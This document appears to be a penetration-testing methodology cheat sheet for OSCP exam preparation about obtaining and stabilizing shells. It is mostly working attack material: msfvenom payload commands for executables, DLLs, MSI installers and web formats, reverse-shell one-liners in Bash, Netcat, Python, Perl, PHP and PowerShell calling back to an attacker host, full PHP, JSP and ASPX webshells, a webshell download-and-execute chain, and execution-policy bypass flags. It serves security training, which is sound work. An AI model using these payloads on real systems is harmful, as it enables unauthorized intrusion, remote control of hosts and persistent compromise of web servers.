# Shells and Payloads Methodology

> *Operational Workflow: Shell Architecture Selection (Phase 1) -> Listener Configuration (Phase 2) -> Payload Generation with MSFvenom (Phase 3) -> Shell Stabilization (Phase 4) -> Native Reverse Shell One-Liners (Phase 5) -> Webshell Deployment & Upgrade (Phase 6) -> Troubleshooting (Phase 7) -> Operational Checklist (Phase 8)*
> *Essential Cheatsheets: [[🐢 reverse-shells|Reverse Shells]], [[🐧 linux-commands|Linux Commands]], [[🪟 windows-commands|Windows Commands]], [[🔧 impacket|Impacket]], [[🔀 ligolo-chisel|Ligolo & Chisel]]*

---

# Phase 0: Shell Architecture and Concepts

> *Achieving remote command execution is only the first step. Establishing an interactive, resilient shell session requires understanding network socket directions, payload staging mechanisms, and terminal capabilities.*

### Reverse Shell vs Bind Shell vs Webshell

```text
1. REVERSE SHELL (Target connects OUT to Attacker)
   [ Kali Listener: 443 ] <════════ [ Target connects out ] ════════ [ Compromised Host ]
   - Optimal for: 95% of penetration testing scenarios.
   - Advantage: Bypasses inbound perimeter firewalls because egress traffic is generally permitted.

2. BIND SHELL (Attacker connects IN to Target)
   [ Kali Client ] ════════════════> [ Target binds to port: 4444 ] ──> [ Compromised Host ]
   - Optimal for: Strict egress filtering where outbound traffic is blocked, but inbound ports are reachable.
   - Drawback: Blocked by standard perimeter firewalls and NAT configurations.

3. WEBSHELL (Synchronous Request-Response Bridge)
   [ Kali Browser / curl ] ── HTTP GET/POST ──> [ Target Web Server ] ──> Command Execution
   - Optimal for: Initial foothold when outbound sockets cannot be spawned.
   - Stepping Stone: Used to execute commands in-browser, drop binaries, or trigger a full reverse shell.
```

---

# Shell and Payload Triage Matrix

> *Operational Triage: Select the appropriate shell type, payload format, or stabilization technique based on target capabilities, operating system, and firewall constraints.*

| Discovered Scenario / Target Capability | Recommended Shell or Payload Technique | Methodology Section |
| :--- | :--- | :--- |
| Standard initial foothold / Egress allowed | Reverse Shell via Netcat Listener | [[#Phase 2: Shell Listener Configuration]] |
| Need stageless executable for Linux or Windows | MSFvenom ELF or EXE Binary Generation | [[#3.2: Linux Payload Formats]] |
| Target restricted to web service (IIS, Apache, Tomcat) | Web Payloads (PHP, ASPX, WAR) | [[#3.4: Web Application Payloads]] |
| Shell drops on Ctrl+C / No tab completion (Linux) | Python PTY or Socat Terminal Stabilization | [[#4.1: Linux Shell Stabilization]] |
| Raw Windows command prompt / Missing arrow keys | Rlwrap Listener or PowerShell ConPty Shell | [[#4.2: Windows Shell Stabilization]] |
| Command execution via web injection (Bash, Python, Perl) | Native Scripting Reverse Shell One-Liners | [[#Phase 5: Native Reverse Shell One-Liners by Language]] |
| File upload vulnerability / Web directory access | Webshell Deployment and Upgrading | [[#Phase 6: Webshell Deployment and Upgrading to Full Shell]] |
| Shell connects but dies immediately / Silent failures | Payload Debugging and Failure Analysis | [[#Phase 7: Common Failures and Operational Fixes]] |

---

# Phase 1: Choosing Your Shell Strategy

| Operational Scenario | Target Operating System | Recommended Approach | Technical Rationale |
| :--- | :--- | :--- | :--- |
| Normal network environment | Linux / Windows | **Stageless Reverse Shell** | Targets connect back reliably over permitted ports (443, 80). |
| Outbound traffic completely blocked | Linux / Windows | **Bind Shell** | Target listens locally; attacker connects inbound if port is reachable. |
| Ingress web upload / No command pipe | Linux (PHP) / Windows (IIS) | **Webshell** | Provides interim HTTP command execution to trigger a reverse shell. |
| Egress inspection / Active IDS present | Linux / Windows | **Socat Encrypted Shell** | TLS-encrypted session conceals shell traffic from packet inspection. |

---

# Phase 2: Shell Listener Configuration

> *Always initialize your listener on Kali BEFORE triggering any payload on the target.*

### 1. Standard Netcat Listener (Baseline)
```bash
# Listen on port 443 (recommended port to bypass egress firewalls)
nc -nlvp 443
```
- `-n`: Numeric-only IP addresses (disables slow reverse DNS lookups).
- `-l`: Listen mode for incoming connections.
- `-v`: Verbose output (confirms connection arrival).
- `-p`: Specifies the local port number.

### 2. Rlwrap Listener (Line Editing and Arrow Keys)
Prevents line corruption, enables arrow key navigation, and provides command history for raw shells:
```bash
rlwrap -cAr nc -nlvp 443
```

### 3. Socat Fully Interactive TTY Listener
Listens on Kali and sets up raw terminal characteristics immediately upon connection:
```bash
# Capture full TTY with disabled echo and raw terminal mapping
socat file:`tty`,raw,echo=0 TCP-LISTEN:443
```

### 4. Metasploit Multi-Handler (Staged Payloads Only)
> ⚠️ **OSCP Restriction Reminder:**
> Metasploit is permitted on only ONE target machine during the OSCP exam. If using Metasploit on that machine with staged payloads:

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST [KALI_IP]; set LPORT 443; run"
```

---

# Phase 3: Payload Generation with MSFvenom

> *MSFvenom generates standalone binaries and payload shellcode across architectures. In the OSCP examination, stageless payloads paired with standard Netcat listeners are the mandatory standard.*

## 3.1: Staged vs Stageless Payloads (Critical Distinction)

| Characteristic | Stageless Payload | Staged Payload |
| :--- | :--- | :--- |
| **Naming Convention** | Separated by underscores: `shell_reverse_tcp` | Separated by slashes: `shell/reverse_tcp` |
| **Payload Architecture** | Fully self-contained inside the binary | Small "stager" downloads payload from handler |
| **Compatible Listener** | Standard Netcat (`nc -nlvp`), Socat, Metasploit | **Metasploit `multi/handler` ONLY** |
| **OSCP Applicability** | **Default Standard across all exam machines** | Restricted to the single allowed Metasploit target |

> ⚠️ **Critical Listener Mismatch:**
> If a staged payload (`windows/x64/shell/reverse_tcp`) connects to a standard Netcat listener, the connection establishes and immediately terminates because Netcat cannot deliver the second-stage payload. **Always verify the underscore notation (`_`) when using Netcat.**

---

## 3.2: Linux Payload Formats

```bash
# Linux ELF Binary (Stageless, x64)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=443 -f elf -o shell.elf
chmod +x shell.elf

# Linux ELF Binary (Stageless, x86 - 32-bit)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=[KALI_IP] LPORT=443 -f elf -o shell_x86.elf

# Linux Python Script One-Liner
msfvenom -p cmd/unix/reverse_python LHOST=[KALI_IP] LPORT=443 -f raw

# Linux Pure Bash One-Liner
msfvenom -p cmd/unix/reverse_bash LHOST=[KALI_IP] LPORT=443 -f raw
```

---

## 3.3: Windows Payload Formats

```bash
# Windows Executable (Stageless, x64)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=443 -f exe -o shell.exe

# Windows Executable (Stageless, x86 - Legacy Compatibility)
msfvenom -p windows/shell_reverse_tcp LHOST=[KALI_IP] LPORT=443 -f exe -o shell_x86.exe

# Windows Dynamic Link Library (DLL Hijacking)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=443 -f dll -o shell.dll

# Windows MSI Installer Package (AlwaysInstallElevated Privilege Escalation)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=443 -f msi -o setup.msi

# Windows Encoded PowerShell Script
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=443 -f psh-cmd -o payload.bat
```

---

## 3.4: Web Application Payloads

```bash
# PHP Reverse Shell (Apache / Nginx Web Servers)
msfvenom -p php/reverse_php LHOST=[KALI_IP] LPORT=443 -f raw > shell.php

# ASP Reverse Shell (Legacy Microsoft IIS Classic ASP)
msfvenom -p windows/shell_reverse_tcp LHOST=[KALI_IP] LPORT=443 -f asp > shell.asp

# ASPX Reverse Shell (Modern Microsoft IIS .NET Web Applications)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=443 -f aspx > shell.aspx

# Java WAR Archive (Apache Tomcat Web Management Application)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[KALI_IP] LPORT=443 -f war -o shell.war

# JSP Raw Web Script (Standalone Java Server Pages)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[KALI_IP] LPORT=443 -f raw > shell.jsp
```

---

## 3.5: Identifying Target System Architecture

```bash
# Target Linux Host: Inspect Architecture and Binary Format
uname -m          # x86_64 = 64-bit, i686/i386 = 32-bit
file /bin/bash     # Verifies ELF 64-bit or 32-bit execution context
```

```cmd
:: Target Windows Host: Inspect Architecture
systeminfo | findstr /B /C:"System Type"
wmic os get osarchitecture
```
> 💡 *Golden Rule: When architecture is ambiguous, generate an **x86 (32-bit)** payload; 32-bit executables run natively on both 32-bit and 64-bit architectures via WOW64.*

---

# Phase 4: Shell Stabilization Techniques

> *Raw Netcat shells lack terminal controls (tab completion, arrow keys, clear screen) and terminate catastrophically if Ctrl+C is pressed. Always stabilize your shell immediately upon connection.*

## 4.1: Linux Shell Stabilization

### Method 1: Python PTY Spawn (Standard Industry Procedure)

```bash
# Step 1: Spawn a pseudoterminal via Python in the raw shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# If Python 3 is missing, try Python 2:
python -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell process
# Press keyboard shortcut: Ctrl + Z

# Step 3: Configure Kali local terminal to raw mode and return shell to foreground
stty raw -echo; fg

# Step 4: Re-initialize terminal environment variables inside the target shell
reset
export SHELL=bash
export TERM=xterm-256color

# Step 5: Adjust terminal geometry to match your local terminal window
# On Kali (separate terminal): check window dimensions via `stty size` (e.g. 45 180)
stty rows 45 cols 180
```

### Method 2: Script Utility (When Python is Missing)
```bash
# Inside the raw reverse shell:
/usr/bin/script -qc /bin/bash /dev/null

# Background shell: Ctrl + Z
stty raw -echo; fg
export TERM=xterm-256color
```

### Method 3: Socat Standalone Fully Interactive TTY
```bash
# 1. On Kali: Run Socat Listener
socat file:`tty`,raw,echo=0 TCP-LISTEN:443

# 2. On Target: Connect back using Socat with full terminal mapping
socat TCP:[KALI_IP]:443 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

---

## 4.2: Windows Shell Stabilization

Windows interactive command prompts do not possess standard Unix PTY semantics. Apply the following options:

```powershell
# Option 1: Spawn native PowerShell from CMD
# Provides command history, cmdlet tab completion, and multi-line script capabilities:
powershell -ep bypass

# Option 2: Wrap Netcat on Kali with rlwrap
# Provides command history, left/right arrow navigation, and line recall:
rlwrap nc -nlvp 443

# Option 3: Deploy ConPty Fully Interactive Windows Pseudo-Console
# On Kali: Start listener with stty raw configuration:
# Download Invoke-ConPtyShell.ps1 from GitHub
# On Windows Target: Execute ConPtyShell pointing to Kali listener:
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://[KALI_IP]/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell [KALI_IP] 443"
```

---

# Phase 5: Native Reverse Shell One-Liners by Language

> *When command execution is achieved via injection, web exploitation, or cron jobs, deploy these reliable native one-liners.*

### 1. Bash TCP Socket One-Liners
```bash
# Standard Bash interactive redirection
bash -i >& /dev/tcp/[KALI_IP]/[PORT] 0>&1

# Bash read-write file descriptor redirection
0<&196;exec 196<>/dev/tcp/[KALI_IP]/[PORT]; sh <&196 >&196 2>&196

# Explicit bash binary invocation
/bin/bash -c 'bash -i >& /dev/tcp/[KALI_IP]/[PORT] 0>&1'
```

### 2. Netcat One-Liners
```bash
# Netcat Traditional (with -e support)
nc -e /bin/bash [KALI_IP] [PORT]
nc -e /bin/sh [KALI_IP] [PORT]

# Netcat OpenBSD / BusyBox (No -e flag: Named Pipe FIFO Method)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc [KALI_IP] [PORT] > /tmp/f
```

### 3. Python One-Liners
```bash
# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[KALI_IP]",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[KALI_IP]",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### 4. Perl One-Liner
```bash
perl -e 'use Socket;$i="[KALI_IP]";$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### 5. PHP One-Liner
```bash
php -r '$sock=fsockopen("[KALI_IP]",[PORT]);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### 6. Windows PowerShell One-Liners
```powershell
# Standard PowerShell TCP Client Socket
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('[KALI_IP]',[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Base64 Encoded PowerShell Command (Bypasses character escaping issues)
# On Kali: Encode command to UTF-16LE Base64:
# echo -n "$client = New-Object..." | iconv -t UTF-16LE | base64 -w 0
powershell -nop -enc [BASE64_ENCODED_STRING]
```

---

# Phase 6: Webshell Deployment and Upgrading to Full Shell

> *A webshell provides browser-based, synchronous command execution. It is inherently non-interactive and fragile. Always upgrade a webshell to an interactive reverse shell immediately.*

### 1. Minimal Webshell Artifacts

```php
// PHP Minimal Webshell
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; } ?>
```

```jsp
<%-- JSP Minimal Webshell --%>
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```aspx
<%-- ASPX Minimal Webshell --%>
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    void Page_Load(object sender, EventArgs e) {
        if (Request["cmd"] != null) {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + Request["cmd"];
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.Start();
            Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
        }
    }
</script>
```

### 2. Webshell to Reverse Shell Upgrade Workflow

```text
1. VERIFY CONNECTIVITY:
   Execute via browser or curl:
   http://[TARGET_IP]/shell.php?cmd=ping+-c+1+[KALI_IP]
   Monitor on Kali: sudo tcpdump -i tun0 icmp

2. INITIALIZE KALI LISTENER:
   nc -nlvp 443

3. TRIGGER REVERSE SHELL ONE-LINER:
   URL-encode payload characters before executing via HTTP GET:
   http://[TARGET_IP]/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/[KALI_IP]/443+0>%261'

4. FALLBACK: STAGE STANDALONE BINARY VIA WEBSHELL:
   If one-liners fail, download and execute an ELF or EXE binary:
   http://[TARGET_IP]/shell.php?cmd=curl+http://[KALI_IP]/shell.elf+-o+/tmp/shell.elf
   http://[TARGET_IP]/shell.php?cmd=chmod+%2Bx+/tmp/shell.elf
   http://[TARGET_IP]/shell.php?cmd=/tmp/shell.elf

5. STABILIZE THE SHELL IMMEDIATELY (Phase 4).
```

---

# Phase 7: Common Failures and Operational Fixes

| Observed Failure / Error | Underlying Root Cause | Verified Operational Fix |
| :--- | :--- | :--- |
| **Shell connects and instantly dies** | Architecture mismatch or staged payload sent to Netcat | Re-verify target architecture (`uname -m` / `systeminfo`). Ensure MSFvenom payload uses underscore (`shell_reverse_tcp`). |
| **Connection Refused on Kali** | Listener uninitialized or wrong port specified | Verify `nc -nlvp [PORT]` is running on Kali prior to executing the reverse connection on the target. |
| **Shell hangs with zero console output** | Staged payload waiting for stager transmission | Switch to stageless payload format (`linux/x64/shell_reverse_tcp`). |
| **Reverse shell never reaches Kali** | Egress firewall dropping outbound traffic | Switch to port 443, 80, or 53. If outbound ports are strictly blocked, switch to a **Bind Shell**. |
| **PowerShell command blocked** | Execution policy restriction or AMSI trigger | Prepend execution flags: `powershell -ep bypass -nop -enc [BASE64]`. |
| **Python one-liner syntax error** | Target running Python 3 instead of Python 2 | Check `which python` vs `which python3`. Update syntax accordingly. |
| **`nc -e` fails with error** | Target runs OpenBSD Netcat without execution flag | Deploy the Netcat FIFO Named Pipe one-liner (`mkfifo /tmp/f...`). |
| **Shell terminates on Ctrl+C** | Shell operating in unbuffered raw TTY mode | Execute Python PTY stabilization (`stty raw -echo; fg`) immediately upon receiving shell. |
| **PHP webshell displays blank page** | Functions disabled in `php.ini` (`disable_functions`) | Test alternative execution wrappers: `passthru()`, `system()`, `popen()`, `exec()`, or backticks. |

---

# Phase 8: Quick Reference Shell Checklist

```text
=== PHASE 1: PRE-FLIGHT LISTENER SETUP ===
[ ] Identify target OS and architecture      -> uname -m (Linux)  OR  systeminfo (Windows)
[ ] Select egress-friendly port              -> Port 443 (HTTPS) or Port 80 (HTTP)
[ ] Start listener on Kali                   -> rlwrap nc -nlvp 443  OR  socat file:`tty`,raw,echo=0 TCP-L:443

=== PHASE 2: PAYLOAD GENERATION & EXECUTION ===
[ ] Verify stageless payload syntax          -> Ensure underscore: shell_reverse_tcp (NOT shell/reverse_tcp)
[ ] Generate binary payload (if applicable)  -> msfvenom -p linux/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=443 -f elf
[ ] Or execute native language one-liner     -> Bash, Python, Perl, or PowerShell TCP Client
[ ] URL-encode payload if passed via HTTP    -> Encode &, +, =, spaces before sending via GET requests

=== PHASE 3: POST-CONNECTION STABILIZATION ===
[ ] Spawn pseudo-terminal (Linux)            -> python3 -c 'import pty; pty.spawn("/bin/bash")'
[ ] Background shell                         -> Press Ctrl + Z
[ ] Enable raw terminal mode on Kali         -> stty raw -echo; fg
[ ] Export terminal variables                -> export TERM=xterm-256color; export SHELL=bash
[ ] Synchronize window dimensions            -> stty size (on Kali) -> stty rows [X] cols [Y] (on target)
[ ] Proceed to privilege escalation          -> Cross-reference [[03-Linux-PrivEsc]] or [[04-Windows-PrivEsc]]
```
